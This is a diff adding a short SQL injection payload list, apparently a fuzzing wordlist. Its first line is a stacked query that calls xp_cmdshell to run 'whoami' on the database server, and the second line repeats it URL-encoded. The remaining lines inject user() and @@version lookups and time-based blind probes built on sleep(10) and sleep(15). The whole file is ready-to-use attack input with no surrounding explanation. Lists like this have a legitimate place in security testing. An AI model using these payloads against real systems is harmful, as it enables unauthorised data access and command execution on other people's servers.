@@ -1,0 +1,22 @@
+desc;exec master.xp_cmdshell 'whoami>%TEMP%\SQL.txt'-- 
+%64%65%73%63%3b%65%78%65%63%20%6d%61%73%74%65%72%2e%78%70%5f%63%6d%64%73%68%65%6c%6c%20%27%77%68%6f%61%6d%69%3e%25%54%45%4d%50%25%5c%53%51%4c%2e%74%78%74%27%2d%2d%20
+user()--
+,user()--
+',user()--
+",user()--
+@@version--
+,@@version#
+,@@version--
+',@@version--
+",@@version--
+sleep(10)
+sleep(10)--
+sleep(10)#
+,sleep(10)--
+',sleep(10)--
+",sleep(10)--
+-sleep(15)
+-sleep(15)--
+,-sleep(15)--
+',sleep(15)--
+",sleep(15)--
